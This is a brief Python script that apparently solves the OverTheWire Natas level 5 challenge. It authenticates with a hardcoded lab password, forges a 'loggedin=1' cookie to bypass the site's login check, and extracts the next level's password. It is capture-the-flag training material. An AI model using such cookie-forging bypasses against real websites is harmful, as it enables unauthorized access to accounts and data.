import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
url = 'http://%s.natas.labs.overthewire.org/' % username
cookiet = {'loggedin': '1'}
res = requests.get(url, auth=(username, password), cookies=cookiet)
# print(ses.cookies)
content = res.text
#print(content)
print(re.findall("Access granted. The password for natas6 is (.*)</div>", content)[0])
